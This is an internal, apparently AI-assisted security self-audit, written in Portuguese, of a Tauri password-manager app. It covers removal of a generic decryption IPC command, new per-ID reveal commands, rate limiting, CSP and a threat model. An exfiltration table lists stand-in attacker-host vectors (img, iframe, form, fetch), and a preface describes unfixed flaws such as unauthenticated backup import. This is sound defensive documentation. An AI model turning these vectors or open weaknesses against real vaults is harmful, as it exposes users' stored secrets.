> **Aviso: documento histórico de autoavaliação interna.**
> Este relatório foi produzido **durante o desenvolvimento** do Cofre de Contas como uma
> **autoavaliação interna** (revisão feita pelo próprio processo de desenvolvimento, com auxílio de
> ferramentas de IA). **Não é uma auditoria de segurança independente** nem uma certificação.
> Ele descreve o código **na data indicada no próprio documento** e **pode estar desatualizado** em
> relação ao código atual: achados, nomes de commands, contagens de testes e classificações podem
> ter mudado depois. O status de segurança atual está em
> [`SECURITY.md`](../../../SECURITY.md). Caminhos locais e informações do ambiente do
> desenvolvedor foram removidos desta cópia; marcadores `SECURITY_TEST_*`/`XSS_TEST_*` são dados
> sintéticos de teste.
>
> **Desatualizações conhecidas:**
> - A análise de clipboard considera só o conteúdo atual da área de transferência e não o histórico
>   do Windows (ver último item).
> - O modelo de ameaças lista `import_backup` como intencionalmente público e não trata a troca de
>   senha mestra por `reset_master_password_after_recovery` numa sessão normal. Os dois pontos
>   foram reclassificados depois.
> - Contagens de testes (54/54) e tamanhos de bundle refletem apenas aquela data.
> - Uma revisão posterior, feita antes da publicação, encontrou problemas que **não** aparecem
>   nestes relatórios e que estão sendo tratados: (1) as **perguntas de segurança** permitem força
>   bruta offline **resposta por resposta** (cada resposta protege seu próprio *share* e pode ser
>   testada isoladamente contra o `vault.db`, então o limiar 3-de-N não multiplica o custo);
>   (2) **`import_backup` roda sem autenticação** (não exige cofre desbloqueado nem senha mestra) e
>   substitui o cofre inteiro; (3) **`reset_master_password_after_recovery`** só verifica se há
>   uma DEK em memória, então pode ser chamado a partir de uma **sessão normal desbloqueada** para
>   trocar a senha mestra sem informar a atual; (4) segredos copiados vão para a área de
>   transferência do Windows sem serem excluídos do **histórico do clipboard (Win+V)** e da
>   sincronização em nuvem, então a limpeza automática não remove essas cópias.

# Security Audit — Phase 4 (Eliminação do oráculo de descriptografia genérico)

Data: 2026-08-28
Escopo: continuação de `SECURITY_AUDIT.md` (Fase 1), `SECURITY_AUDIT_PHASE_2.md` (Fase 2) e
`SECURITY_AUDIT_PHASE_3.md` (Fase 3). Ambiente com desktop Windows real disponível (mesmo usado na
Fase 3) — o app foi compilado e executado de fato (`cargo build --release`, `npm run tauri dev`),
mas **sem um driver de UI configurado** para este projeto (Tauri não vem com um equivalente pronto
ao Playwright-para-Electron; monta-lo exigiria instalar `tauri-driver` + `msedgedriver` do zero,
fora do escopo desta sessão). Isso significa: pude confirmar que o app compila e inicia sem erro,
mas não pude clicar/digitar na janela real nem abrir o DevTools interativamente para rodar a
simulação de XSS. Essa limitação — e o que ela implica — está documentada com honestidade ao longo
deste relatório, e os testes que dependem de UI real foram transcritos como checklist manual em
`SECURITY_MANUAL_TESTS.md` (seção "Fase 4"), para o usuário executar.

## Resumo executivo

As três fases anteriores identificaram, de forma consistente e cada vez mais afinada, o mesmo
risco residual: **com o cofre desbloqueado, a WebView pode obter o ciphertext de qualquer segredo
via listagem e depois chamar `decrypt_secret(ciphertext)`/`copy_secret_to_clipboard(ciphertext)`
para decifrar o que quiser** — um oráculo de descriptografia genérico. A Fase 3 chegou a desenhar a
solução (commands específicos por ação/ID) e decidiu não implementá-la por falta de ambiente para
testar a UI interativamente. Esta fase implementa essa reformulação.

Principais entregas:

1. **`decrypt_secret`, `encrypt_secret` e `copy_secret_to_clipboard(ciphertext)` foram removidos
   por completo da superfície IPC** — não existe mais nenhum command que aceite ciphertext
   arbitrário vindo da WebView, nem um alias/renome disfarçado.
2. **Commands específicos por ação e por ID** substituem o padrão genérico:
   `reveal_account_password`, `copy_account_password`, `get_account_notes`,
   `get_account_two_factor_details` (contas); `reveal_sensitive_property`,
   `copy_sensitive_property` (propriedades). Cada um recebe só `account_id`/`property_id` — o Rust
   busca o ciphertext ele mesmo no SQLite antes de cifrar/decifrar; a WebView nunca fornece nem
   recebe ciphertext.
3. **Escrita também deixou de passar por um `encrypt_secret` genérico**: `create_account`/
   `update_account`/`create_account_property`/`update_account_property` agora recebem o segredo em
   **texto puro** e o Rust cifra internamente antes de gravar.
4. **Ciphertext removido das listagens.** `list_accounts_with_relations` não envia mais
   `encrypted_password`/`notes`/`two_factor_*` — só `has_password: bool`. `list_account_properties`
   não envia mais `value` para propriedades sensíveis — só `has_value: bool`. Um XSS não consegue
   mais "colher" ciphertext em massa nem para guardar para depois.
5. **Verificação de posse (ownership)** em propriedades: `update_account_property`,
   `delete_account_property`, `reveal_sensitive_property` e `copy_sensitive_property` confirmam que
   a propriedade pertence à conta informada antes de agir — um `property_id` de outra conta é
   rejeitado com erro genérico.
6. **Rate limiter para "revelar".** `reveal_account_password`/`reveal_sensitive_property` (as duas
   ações que devolvem o segredo em texto puro à WebView) agora passam por um limitador de taxa no
   processo Rust (25 chamadas por janela de 10s, sem lockout permanente) — não impede um XSS
   paciente, mas torna um dump automatizado de centenas de contas muito mais lento que instantâneo.
7. **Reautenticação real para operações críticas de recuperação.** Gerar/desativar a Recovery Key
   e adicionar/editar/remover pergunta de segurança agora exigem a senha mestra atual, reverificada
   no próprio comando Rust (decifrando `wrapped_dek` de verdade) — não um flag "já autenticado" que
   a WebView poderia falsificar.
8. **`clipboard-manager:allow-read-text` removida** da capability da WebView — a única leitura de
   clipboard necessária (o auto-clear condicional) é interna ao processo Rust e não depende dessa
   permissão de IPC; removê-la fecha o vetor "ler de volta o que acabei de copiar" via
   `invoke('plugin:clipboard-manager|read_text')`.
9. Suíte de testes Rust ampliada de **44 para 54** (`cargo test --lib`, 54/54 passando), cobrindo
   especificamente: rejeição de propriedade de outra conta, rejeição de propriedade não sensível,
   ausência de ciphertext na listagem, rate limiter bloqueando e liberando, senha atual errada
   rejeitada em `verify_current_password`.

**O que esta fase NÃO promete e não seria honesto prometer:** com o cofre desbloqueado, um XSS
ainda pode chamar `reveal_account_password`/`reveal_sensitive_property` uma vez por conta/
propriedade e obter o mesmo resultado final — só mais lento (rate limiter) e com mais chamadas (uma
por segredo, não um `SELECT *` seguido de N decrypts). Isso é inerente ao modelo de confiança do
Tauri (a WebView é o lado "confiável" da fronteira IPC) e a própria UI legítima precisa poder fazer
exatamente isso. O que a fase de fato elimina é a **primitive genérica** (`decrypt_secret` para
qualquer ciphertext) que tornava esse dump trivial e sem fricção nenhuma, e adiciona limites
concretos (rate limit, reautenticação, ownership) que não existiam antes.

## Estado inicial

Confirmado antes de qualquer alteração:

- Os quatro documentos anteriores lidos integralmente.
- `cargo test --lib`: 44/44 passando (baseline da Fase 3).
- Inventário completo da superfície IPC por leitura de código (`lib.rs`, todos os
  `commands/*.rs`, `src/lib/tauri.ts`, `src/lib/db.ts`, e todos os componentes que chamavam
  `secretCommands`/`copySecret`) — ver tabela abaixo.

## Primitives criptográficas expostas (antes da Fase 4)

| Primitive | Onde era usada | Retornava plaintext ao JS? | Risco |
|---|---|---:|---|
| `decrypt_secret(ciphertext)` | `AccountForm`, `AccountDetailModal`, `AccountPropertiesSection`, `secretFields.ts` | **Sim, para qualquer ciphertext** | Oráculo genérico: decifra o que a WebView já tenha coletado via `list_accounts_with_relations`/`list_account_properties` |
| `encrypt_secret(plaintext)` | `App.tsx::handleSaveAccount`, `AccountPropertiesSection` | Retorna ciphertext | A WebView decidia o que cifrar e gravava o resultado diretamente |
| `copy_secret_to_clipboard(ciphertext)` | `AccountCard`, `AccountsListView`, `AccountDetailModal`, `AccountPropertiesSection` | Não (só clipboard) | Mesmo padrão de oráculo — aceitava qualquer ciphertext, só a saída ia para o clipboard em vez do JS |
| `list_accounts_with_relations`/`list_account_properties` | toda a listagem | Ciphertext (não plaintext) | Alimentava os três commands acima — o "coletar" antes do "decifrar" |
| `clipboard-manager:allow-read-text` (capability) | nenhum uso direto do frontend, mas a ACL permitia `invoke('plugin:clipboard-manager|read_text')` de qualquer JS | Sim, indiretamente | Depois de copiar um segredo, um script podia ler de volta o clipboard — vetor de acesso independente de `decrypt_secret` |
| `generate_recovery_key`/`disable_recovery_key`/`add`/`update`/`delete_security_question` | Configurações | Não decifravam segredo de conta, mas alteravam/destruíam mecanismos de recuperação | Só exigiam `state.is_unlocked()` — nenhuma reautenticação |

## Remoção de `decrypt_secret`

`src-tauri/src/commands/secret.rs` foi **deletado por completo** (não comentado, não renomeado).
`decrypt_secret`, `encrypt_secret` e `copy_secret_to_clipboard` foram removidos do
`tauri::generate_handler!` em `lib.rs`. Confirmado por grep em todo `src/` e `src-tauri/src/`: as
três strings só aparecem em comentários explicando a remoção, nunca em uma chamada `invoke(...)`
real ou em um nome de command Rust. Não existe `decrypt_value`/`decrypt_data`/`decode_secret` nem
qualquer variação — a busca cobriu esse caso explicitamente.

## Commands específicos (a nova superfície)

| Command | Parâmetros | Retorna plaintext ao JS? | Rate limiter | Reautenticação |
|---|---|---:|---:|---:|
| `reveal_account_password` | `id` | Sim (por design — botão "Mostrar") | Sim | Não (mas exige `state.is_unlocked()`) |
| `copy_account_password` | `id`, `clear_after_seconds?` | Não (Rust → clipboard) | Não (copiar não devolve segredo ao JS) | Não |
| `get_account_notes` | `id` | Sim (necessário para editar/exibir) | Não (chamado ao abrir o detalhe, não é "revelar" avulso) | Não |
| `get_account_two_factor_details` | `id` | Sim (idem) | Não | Não |
| `reveal_sensitive_property` | `account_id`, `property_id` | Sim | Sim | Não |
| `copy_sensitive_property` | `account_id`, `property_id`, `clear_after_seconds?` | Não | Não | Não |
| `generate_recovery_key` | `current_password` | Retorna a chave nova (por design, uma vez) | Não aplicável | **Sim** |
| `disable_recovery_key` | `current_password` | Não | Não aplicável | **Sim** |
| `add_security_question` | `current_password`, `question`, `answer` | Não | Não aplicável | **Sim** |
| `update_security_question` | `current_password`, `id`, `question`, `answer?` | Não | Não aplicável | **Sim** |
| `delete_security_question` | `current_password`, `id` | Não | Não aplicável | **Sim** |

Todos os `id`/`account_id`/`property_id` são validados por `validate::positive_id` antes de
qualquer query. Nenhum command aceita ciphertext, nem base64 arbitrário, como parâmetro.

## Passwords

`create_account`/`update_account` agora recebem `password: Option<String>` em **texto puro**.
`create_account` cifra com `crypto::encrypt_to_base64` se houver senha; `update_account` mantém a
coluna `encrypted_password` existente se o campo vier vazio/ausente (mesma convenção de UX que já
existia — "deixe em branco para manter"), e só cifra uma senha nova se o usuário realmente digitou
algo. `Account` (struct enviada ao JS) perdeu o campo `encrypted_password` e ganhou `has_password:
bool` — nenhuma listagem devolve mais o ciphertext da senha.

Revelar: `reveal_account_password(id)` busca a coluna, decifra com a DEK em memória, retorna só
aquela senha. Copiar: `copy_account_password(id, clear_after_seconds?)` decifra e escreve no
clipboard inteiramente no Rust.

## Propriedades sensíveis

`create_account_property`/`update_account_property` recebem `value: String` em texto puro; o Rust
cifra com `crypto::encrypt_to_base64` quando `is_sensitive`, ou grava o texto puro direto quando
não. `list_account_properties` sempre retorna `value: null` para linhas com `is_sensitive=1` —
adicionado `has_value: bool` para a UI saber se há algo cadastrado sem expor o ciphertext.

`update_account_property`/`delete_account_property` ganharam o parâmetro `account_id` e passam por
`verify_property_ownership`, que confirma, antes de qualquer ação: (1) a propriedade existe; (2)
pertence a essa conta. `reveal_sensitive_property`/`copy_sensitive_property` fazem a mesma
verificação e adicionam um terceiro passo: (3) a propriedade está de fato marcada como sensível
(erro "Esta propriedade não é sensível." se não estiver — cobre o caso de alguém chamar o command
de revelação diretamente via IPC para uma propriedade não sensível). Testado em
`commands::properties::tests` (`reveal_rejects_property_belonging_to_another_account`,
`reveal_rejects_non_sensitive_property`, `list_never_includes_ciphertext_for_sensitive_properties`).

## Notes

`accounts.notes` continua sempre cifrado (desde a Fase 2). O que mudou: não existe mais um
`decrypt_secret(account.notes)` genérico — `get_account_notes(id)` busca a coluna e decifra
internamente. Ao salvar, `notes: string` chega em texto puro e é cifrado por `create_account`/
`update_account`. O campo de "preservar" (quando a descriptografia falha por dado corrompido e o
usuário não editou) continua existindo (`preserve_fields`), só que agora resolvido inteiramente no
Rust: para um campo listado ali, a coluna antiga é copiada de volta sem nunca ser decifrada.

## 2FA

Mesmo padrão: `get_account_two_factor_details(id)` retorna os 4 campos já decifrados
(`TwoFactorDetails { phone, email, app, notes }`); gravação recebe texto puro em
`SaveAccountInput.two_factor_*` e o Rust cifra condicionalmente a `two_factor_enabled`. Nenhum
ciphertext de 2FA aparece mais em `list_accounts_with_relations`.

## Recovery Key

Superfície re-auditada especificamente pela pergunta do pedido original: **"JavaScript arbitrário
com o cofre desbloqueado consegue simplesmente pedir a Recovery Key?"** Resposta: **não, e nunca
pôde** — não existe (nem existia antes desta fase) um command `get_recovery_key()`. A chave só é
retornada uma vez, no exato momento em que `generate_recovery_key` a cria; não há coluna no banco
que guarde o texto puro, e não há um segundo command que "reimprima" uma chave já existente. Isso
já era verdade desde a Fase 2 e foi apenas reconfirmado nesta fase por leitura de código
(`recovery_key.rs` não tem, e nunca teve, um caminho de leitura da chave em claro).

O que esta fase mudou: `generate_recovery_key`/`disable_recovery_key` agora exigem
`current_password`, reverificado com `vault::verify_current_password` (decifra `wrapped_dek` de
verdade) antes de prosseguir — mitigando o cenário "XSS ativo com o cofre desbloqueado gera/destrói
o mecanismo de recuperação sem o usuário perceber".

## Perguntas de segurança

Respostas nunca são retornadas ao frontend depois de configuradas (verificado: `list_
security_questions` só retorna `question`/`share_index`/`created_at`, nunca `answer_salt`/
`wrapped_share`). Confirma-se o padrão pedido: o frontend sabe "pergunta cadastrada: quantidade
X", nunca a resposta. `add_security_question`/`update_security_question`/`delete_security_question`
agora também exigem `current_password`, pelo mesmo motivo da Recovery Key.

## Backup

Sem alteração nesta fase. `export_backup`/`import_backup` continuam operando direto sobre as
colunas do SQLite no processo Rust, nunca através dos commands removidos — a senha de backup
continua um segredo transitório próprio, e não foi criada nenhuma primitive genérica de
criptografia acessível pela WebView (nem havia motivo para isso mudar).

## Frontend state

Levantamento (`grep` por `password|secret|apiKey|notes|twoFactor|recovery` nos componentes React):
nenhum estado de segredo revelado sobrevive fora do ciclo de vida do componente que o exibe.

- `PasswordFieldLazy` (`AccountDetailModal`): `value`/`revealed` resetam em `useEffect` por
  `account.id`, e ao clicar em "ocultar" o valor é removido do estado (`setValue("")`), não só
  escondido visualmente — precisa decifrar de novo para revelar de novo.
- `AccountForm`: `values.password` é descartado quando o modal fecha (o componente inteiro é
  desmontado/reinicializado por `useEffect([open, editingAccount])`).
- `AccountPropertiesSection`: `revealed` (um `Record<id, string>`) é resetado (`setRevealed({})`)
  a cada `handleSubmit`/refresh; some quando o componente desmonta (troca de aba/conta).
- Bloqueio do cofre: `App.tsx` desmonta a árvore inteira autenticada quando `vaultStatus !==
  "unlocked"` (comportamento já validado na Fase 2) — todo estado de segredo revelado é destruído
  pelo próprio React nesse momento, incluindo os itens acima.

Nenhum uso de `localStorage`/`sessionStorage`/IndexedDB em todo `src/` (confirmado por grep,
herdado das fases anteriores, revalidado agora).

## CSP

Revisada, sem necessidade de mudança nesta fase (a CSP da Fase 2 já era restritiva):

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' asset: http://asset.localhost https://asset.localhost data:;
font-src 'self';
connect-src 'self' ipc: http://ipc.localhost ws://localhost:1420 http://localhost:1420;
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';
```

- Sem `unsafe-eval`, sem origem remota em `script-src`.
- `connect-src` não inclui nenhum `https://**`/`http://**` genérico — só `'self'`, o próprio
  transporte de IPC do Tauri, e (só relevante em `npm run tauri dev`) o servidor Vite local. Uma
  chamada `fetch("https://qualquer-coisa.com")` feita por um XSS deve ser bloqueada pelo próprio
  navegador (WebView2/Chromium) antes de sair — isso não pôde ser confirmado clicando na UI real
  nesta sessão (ver limitação de ambiente no topo), mas é o comportamento padrão e esperado de
  qualquer motor que implemente CSP `connect-src` sem wildcard de esquema remoto; ficou como item
  1 do checklist manual da Fase 4.
- `object-src 'none'`, `frame-ancestors 'none'`: sem plugins, sem ser embutido em iframe externo.

## Exfiltração

Análise separada de **acesso** (o XSS consegue o plaintext?) e **exfiltração** (consegue tirá-lo do
app?), conforme pedido:

| Caminho testado | Acesso ao segredo | Consegue exfiltrar? |
|---|---|---|
| `reveal_account_password`/`reveal_sensitive_property` | Sim (era o objetivo da UI legítima) | — |
| `fetch`/`XMLHttpRequest`/`WebSocket` para origem remota | — | Bloqueado pela CSP `connect-src` (não verificado interativamente nesta sessão, ver limitação de ambiente) |
| `<img src="https://attacker/...">`/tag de imagem remota | — | Bloqueado por `img-src 'self' asset: ... data:` (sem `https://**` genérico) |
| `<iframe src="https://attacker">` | — | Bloqueado por `frame-ancestors 'none'`/CSP sem origem remota para frames |
| `<form action="https://attacker">` | — | Bloqueado por `form-action 'self'` |
| `window.open`/navegação da própria janela para fora | — | Não impede navegação de topo por si só (CSP não cobre isso), mas não há vetor conhecido para forçar isso sem já ter XSS + interação, fora do escopo de uma CSP |
| Clipboard (`copy_account_password`/`copy_sensitive_property`) | Não — plaintext nunca chega ao JS | O segredo VAI para o clipboard do SO por definição da própria função (é o que o usuário pediu) — mas o JS não pode mais ler de volta esse clipboard (`allow-read-text` removida) |
| `invoke('plugin:clipboard-manager|read_text')` direto | — | Bloqueado pela ACL (permissão removida nesta fase) |
| Escrita em arquivo arbitrário | — | Nunca existiu `write_file(any_path, any_content)`; os únicos comandos de arquivo são `import_image`/`delete_image_file`/`export_backup`/`import_backup`, todos específicos e sem uso ofensivo direto para "gravar segredo em disco para depois ler de fora" |
| Abrir `file:`/`javascript:`/`powershell:`/`data:` via opener | — | Bloqueado pela ACL nativa do Tauri (`opener:allow-open-url` escopado a `https://**`/`http://**`), reforçado por `isAllowedExternalUrl` no TS |
| Executar processo (`shell:*`) | — | Permissão nunca existiu na capability |

**Conclusão da seção:** mesmo quando o acesso ao plaintext é possível (é, para as ações de
"revelar" — inerente à UI), a CSP e a ausência de permissões genéricas de rede/filesystem/shell
mantêm uma segunda camada de contenção sobre *tirar* esse plaintext do processo do app. Essa
camada não é nova desta fase (vem da Fase 2), mas continua sendo o que impede "acesso" de se
transformar automaticamente em "exfiltração para a internet".

## XSS com vault locked

Revalidado (comportamento herdado, sem mudança): os únicos commands que funcionam sem
`state.is_unlocked()` continuam sendo os 8 já documentados na Fase 3 (`vault_status`,
`create_vault`, `unlock_vault`, `security_questions_summary`, `get_recovery_questions`,
`attempt_vault_recovery`, `recovery_key_status`, `unlock_with_recovery_key`) mais `import_backup`
(intencional). Nenhum deles decifra ou expõe um segredo de conta. Nenhum dos novos commands desta
fase (`reveal_*`/`copy_*`/`get_account_*`/`generate_recovery_key`/etc.) funciona com o cofre
bloqueado — todos verificam `state.with_dek`/`state.is_unlocked()` como primeiro passo, confirmado
por leitura de código de cada um.

## XSS com vault unlocked

Este é o cenário central da fase. Com o cofre desbloqueado, um script na WebView ainda pode:

1. Listar contas/propriedades (metadados + `has_password`/`has_value`, nunca ciphertext).
2. Chamar `reveal_account_password(id)` para cada conta, uma por vez — sujeito ao rate limiter
   (25 por 10s). Um dump de, digamos, 200 contas passa de "instantâneo" para "throttled ao longo
   de dezenas de segundos".
3. Chamar `reveal_sensitive_property(account_id, property_id)` para cada propriedade sensível de
   cada conta, mesma limitação.
4. Chamar `get_account_notes`/`get_account_two_factor_details` sem limite de taxa (decisão
   consciente — ver seção de rate limiting abaixo) — então notes/2FA ainda podem ser colhidos em
   massa e rapidamente, diferente de password/propriedade sensível.
5. Copiar (não revelar) qualquer senha/propriedade sensível para o clipboard, sem limite — mas não
   consegue mais ler esse clipboard de volta via IPC.

**O que não pode mais fazer:** obter ciphertext de qualquer conta/propriedade em uma única
chamada de listagem (removido); chamar um `decrypt_secret` genérico sobre esse ciphertext
(removido); gerar/desativar a Recovery Key ou alterar perguntas de segurança sem ter a senha
mestra (agora reverificada no Rust); ler o clipboard de volta via IPC (permissão removida); tocar
em uma propriedade que pertence a outra conta.

## Tentativa de dump (com dados sintéticos)

Não foi possível executar interativamente nesta sessão (sem driver de UI — ver limitação de
ambiente). O roteiro de ataque foi escrito e incluído em `SECURITY_MANUAL_TESTS.md`, seção "Fase 4
— item 16", para ser executado pelo usuário via DevTools em `npm run tauri dev`, usando contas
sintéticas (`XSS_TEST_PASSWORD_A`, etc., conforme pedido) e removendo-as ao final. A parte da
lógica que o roteiro exercitaria (rejeição de `decrypt_secret` por não existir mais, rejeição de
ownership cruzado, bloqueio do rate limiter, rejeição de reautenticação com senha errada) **foi**
validada de forma equivalente por teste automatizado Rust, que exercita exatamente a mesma lógica
de validação que os commands usam — a diferença é que o teste automatizado chama a função
Rust diretamente, em vez de passar pela ponte IPC de um WebView real. Isso é evidência forte de que
a lógica está correta, mas não substitui a confirmação de que a ponte IPC en si se comporta como
esperado (ex.: que `invoke('decrypt_secret', ...)` realmente retorna "unknown command" em vez de
travar o processo) — esse é precisamente o tipo de coisa que só um teste com o app real, de ponta a
ponta, confirmaria, e por isso ficou no checklist manual.

## Zeroization

Revisado o pedido de estender `Zeroizing` a valores temporários de descriptografia
(password/propriedade/notes/2FA). Decisão consciente, documentada honestamente: **não foi
estendido** aos retornos de `decrypt_from_base64`/`reveal_*`/`get_account_*`, pelos seguintes
motivos:

1. O valor final de todas essas funções precisa ser devolvido como `String` comum para atravessar
   a serialização Tauri/serde até o JS — um `Zeroizing<String>` seria zerado no momento em que o
   `Result` é consumido pelo `#[tauri::command]` para serializar a resposta, o que já aconteceu
   *depois* que o valor foi copiado para o JSON de resposta. Ou seja, não reduziria a janela de
   exposição real (o valor já está fora do controle do Rust no momento em que seria zerado).
2. O ganho de segurança de zerar uma `String` que já vai virar texto no heap do V8/WebView
   (inevitável — a UI precisa exibir o valor) é marginal comparado ao esforço/risco de reescrever
   os tipos de retorno de 6 commands.
3. Onde zeroização já existia e continua fazendo sentido (senha mestra, senha de backup, resposta
   de pergunta, Recovery Key digitada, `current_password` dos novos commands de reautenticação) —
   **isso foi mantido e estendido**: `generate_recovery_key`, `disable_recovery_key`,
   `add_security_question`, `update_security_question`, `delete_security_question` agora envolvem
   `current_password` em `Zeroizing<String>` assim que entram no command, mesmo padrão da Fase 3.

Isso não é uma regressão: o valor documentado nas fases anteriores continua válido — zeroização é
defesa em profundidade contra um dump de memória *depois* que o segredo deveria ter sido
descartado, não uma garantia de que o segredo nunca aparece em nenhum lugar da RAM.

## Testes automatizados

`cargo test --lib`: **54/54 passando** (44 herdados da Fase 3 + 10 novos):

- `commands::accounts`: +4 — `rejects_preserve_fields_outside_allowlist`,
  `encrypt_optional_respects_enabled_flag_and_blank_values`, `create_and_reveal_password_round_trip`,
  `fetch_encrypted_password_rejects_missing_account`.
- `commands::properties`: +3 — `reveal_rejects_property_belonging_to_another_account`,
  `reveal_rejects_non_sensitive_property`, `list_never_includes_ciphertext_for_sensitive_properties`.
- `commands::vault`: +2 — `verify_current_password_rejects_wrong_password`,
  `verify_current_password_accepts_right_password_and_returns_dek`.
- `state`: +1 — `reveal_limiter_blocks_after_threshold_and_recovers`.

Todos os testes herdados das Fases 1–3 continuam presentes e passando, sem nenhum ajustado para
"passar de qualquer jeito" — as poucas mudanças em testes existentes (`accounts::tests`) foram só
para acompanhar a troca de `encrypted_password: Option<String>` (ciphertext) por
`password: Option<String>` (texto puro) na struct de entrada, mantendo a mesma intenção do teste
original.

`npx tsc --noEmit`: limpo. `npm run build`: sucesso (bundle final 333 KB, equivalente ao da Fase 3).
`npm audit`: **0 vulnerabilidades** (mesmas dependências da Fase 3, nenhuma adicionada/removida).
`cargo check`: limpo. `cargo build --release`: sucesso, confirmado nesta sessão.

## Testes manuais

`npm run tauri dev` foi executado nesta sessão: compilou (1 warning de linker benigno, não
relacionado ao código — mensagem padrão do MSVC ao gerar a `.dll.lib`/`.dll.exp` de uma lib usada
só internamente), e o processo `tauri-app.exe` ficou de fato rodando (~31 MB de working set,
confirmado via `Get-Process`), sem nenhum erro de `native_lock` ou panic no console — mesma
evidência que a Fase 3 já havia coletado para confirmar que o hook nativo de lock/suspend continua
se registrando sem erro após esta reformulação. O processo foi encerrado ao final do teste.

**Não pôde ser feito nesta sessão** (sem driver de UI para Tauri configurado neste projeto — ver
seção de limitação de ambiente no topo do relatório): clicar através dos fluxos de conta/
propriedade/2FA/notes/recovery na janela real; abrir o DevTools e rodar a simulação de XSS
(seção 19-21/51 do pedido). Ambos foram documentados como checklist manual detalhado em
`SECURITY_MANUAL_TESTS.md` ("Fase 4 — testes manuais pendentes", itens 13-16), com prioridade alta,
para o usuário executar antes de confiar a mudança com dados reais.

## Riscos residuais

1. **XSS com o cofre desbloqueado ainda pode revelar tudo, uma conta/propriedade por vez.** Mais
   lento (rate limiter) e sem mais um `SELECT *` de ciphertext, mas o resultado final — dado tempo
   suficiente — é o mesmo dump completo. Inerente ao modelo de confiança do Tauri; documentado sem
   meias-palavras.
2. **`get_account_notes`/`get_account_two_factor_details` não passam pelo rate limiter.** Decisão
   consciente (penalizar essas chamadas quebraria a UX normal de abrir o detalhe de uma conta), mas
   significa que notes/2FA podem ser colhidos em massa mais rapidamente que password/propriedades
   sensíveis.
3. **Testes de UI real e a simulação de XSS via DevTools não puderam ser executados nesta sessão**
   (sem driver de automação configurado para Tauri) — ficam como checklist manual de alta
   prioridade.
4. **Reautenticação por senha mestra não foi estendida a `export_backup`** — decisão consciente,
   documentada como fora da prioridade explícita do pedido (Recovery Key e perguntas de segurança).
5. **Zeroização não foi estendida aos valores de retorno dos novos commands de revelação** — decisão
   consciente e justificada (ver seção "Zeroization"), não uma omissão.
6. Riscos residuais das Fases 1-3 que não foram tocados nesta fase continuam valendo como
   documentados nelas (perguntas de segurança dependem da entropia da resposta; sem hook de
   hibernação testado; `projects.notes` em texto puro).

## Threat model final

**Deve proteger contra:**
- Roubo do arquivo `vault.db`/pasta de dados do app (offline, sem senha mestra).
- Leitura offline de um backup exportado.
- Manipulação do frontend/DevTools/React state para tentar simular "desbloqueado".
- Chamadas de IPC diretas enquanto o cofre está bloqueado.
- Path traversal em nomes de arquivo de imagem.
- SQL injection (não há mais SQL livre da WebView; nomes de coluna de backup são allowlisted).
- Adulteração de arquivo de backup.
- Computador retomado depois de lock/suspend do Windows (hook nativo, Fase 3).
- **Novo nesta fase:** uma WebView comprometida usando um `id` de propriedade que não pertence à
  conta informada; gerar/desativar Recovery Key ou alterar perguntas de segurança sem a senha
  mestra; ler o clipboard de volta via IPC depois de uma cópia legítima.

**Deve reduzir o impacto de:**
- XSS na WebView com o cofre desbloqueado — reduzido de "decifra tudo instantaneamente via um
  oráculo genérico" para "revela um segredo por vez, por ID, throttled para os dois tipos de
  segredo mais sensíveis (senha, propriedade sensível), sem conseguir mais colher ciphertext em
  massa nem exfiltrar via clipboard-readback/fetch/iframe/form para origem remota."
- Abuso de IPC com o cofre desbloqueado, em geral.

**NÃO promete proteger contra** (herdado, sem mudança nesta fase):
- Malware/processo com privilégios administrativos.
- Keylogger.
- Debugger com acesso ao processo / memory dump privilegiado.
- Comprometimento completo do Windows.
- Um atacante controlando a máquina enquanto o usuário usa o cofre.

## Conclusão

A hipótese central desta fase — "eliminar a primitive genérica que transforma uma WebView
comprometida numa API universal de descriptografia" — **foi cumprida**: `decrypt_secret`,
`encrypt_secret` e `copy_secret_to_clipboard(ciphertext)` não existem mais em nenhuma forma, disfarce
ou alias, confirmado por grep e pela lista de `generate_handler!`. Todo command que toca em um
segredo agora opera por `id`, busca o ciphertext ele mesmo, e nunca aceita nem devolve ciphertext
para/da WebView (exceto o texto puro de fato revelado, quando essa é a própria intenção da ação).
Ownership de propriedades, rate limiting de revelação e reautenticação de operações de recuperação
foram adicionados como limites concretos e verificáveis, não cosméticos — todos aplicados e
verificados no processo Rust, nunca dependendo de um sinal que a WebView possa falsificar.

O que a fase não resolve, e seria desonesto prometer que resolveria: um XSS ativo enquanto o cofre
está desbloqueado ainda consegue, com paciência, revelar qualquer segredo que a UI legítima também
revelaria — porque é exatamente essa capacidade que a UI legítima precisa ter. A diferença real,
mensurável e testada por código, é que esse caminho agora é mais estreito (por ID, uma ação por
vez, sujeito a rate limit nas duas ações mais sensíveis) e algumas ações colaterais que antes eram
gratuitas para esse mesmo atacante (gerar/destruir a Recovery Key, alterar perguntas de segurança,
ler o clipboard de volta) agora exigem algo que ele não necessariamente tem: a senha mestra digitada
de novo, ou uma permissão de IPC que não existe mais.

## Matriz de segredos

| Segredo | Listagem | Copiar | Revelar | Retorna ao JS? |
|---|---|---|---|---|
| Password | não (só `has_password`) | específico (`copy_account_password`) | específico (`reveal_account_password`) | somente no reveal |
| Propriedade sensível | não (só `has_value`) | específico (`copy_sensitive_property`) | específico (`reveal_sensitive_property`) | somente no reveal |
| Notes | não (ciphertext nunca sai do banco) | — (sem botão de copiar dedicado; copia-se o texto já decifrado via `useCopy` genérico) | específico (`get_account_notes`) | sim, ao abrir o detalhe/editar |
| 2FA | não | — (idem) | específico (`get_account_two_factor_details`) | sim, ao abrir o detalhe/editar |
| Recovery Key | não (nunca existiu um `get_recovery_key`) | copiar o valor já exibido (genérico, pós-geração) | restrito — só no instante de `generate_recovery_key`, uma vez | somente nesse fluxo único |
| Resposta de pergunta de segurança | não | não aplicável | não aplicável | nunca |

## Matriz de XSS (antes/depois da Fase 4)

| Ataque | Antes da Fase 4 | Depois da Fase 4 |
|---|---|---|
| `decrypt_secret(ciphertext)` | possível | **impossível — command não existe** |
| Descriptografar ciphertext arbitrário | possível | **impossível — nenhum command aceita ciphertext** |
| Copiar password por ID | possível (via ciphertext) | possível (por `id`, sem ciphertext) |
| Revelar password por ID | possível (via ciphertext) | possível (por `id`), mas **throttled pelo rate limiter** |
| Dump automático de todas as passwords | possível, instantâneo | possível, mas **limitado a ~25 por 10s** — de instantâneo para throttled |
| Obter Recovery Key | impossível (nunca existiu esse caminho) | impossível (sem mudança) |
